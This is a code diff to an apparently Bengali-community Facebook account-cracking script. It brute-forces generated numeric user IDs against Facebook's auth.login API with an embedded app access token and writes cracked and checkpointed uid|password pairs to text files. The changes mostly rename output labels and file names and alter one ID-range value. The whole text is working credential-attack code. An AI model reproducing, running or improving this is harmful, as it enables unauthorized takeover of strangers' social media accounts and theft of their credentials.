@@ -896,15 +896,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝐒𝐚𝐣𝐢𝐝]%s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[RYNNATHID]%s | %s\033[1;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝐒𝐡𝐞𝐞𝐫𝐨.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("RYYNNATHID.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝐒𝐚𝐣𝐢𝐝] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[RYNNATHID] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝐬𝐚𝐣𝐢𝐝.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("RYNNATHID.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -912,7 +912,7 @@ class Main:
 		self.loop +=1
  
 	def old2(self):
-		x = 1111111111
+		x = 111111111
 		xx = 9999999999
 		idx = "10000" 
 		os.system('clear');print(logo)
@@ -1327,13 +1327,13 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝐬𝐚𝐣𝐢𝐝] %s | %s\033[0;32m         "%(uid, pw))
+				print("\r \033[1;32m[RYNNATHID] %s | %s\033[0;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝐒𝐚𝐣𝐢𝐝.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝐬𝐚𝐣𝐢𝐝] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[RYNNATHD] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("Successfull.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
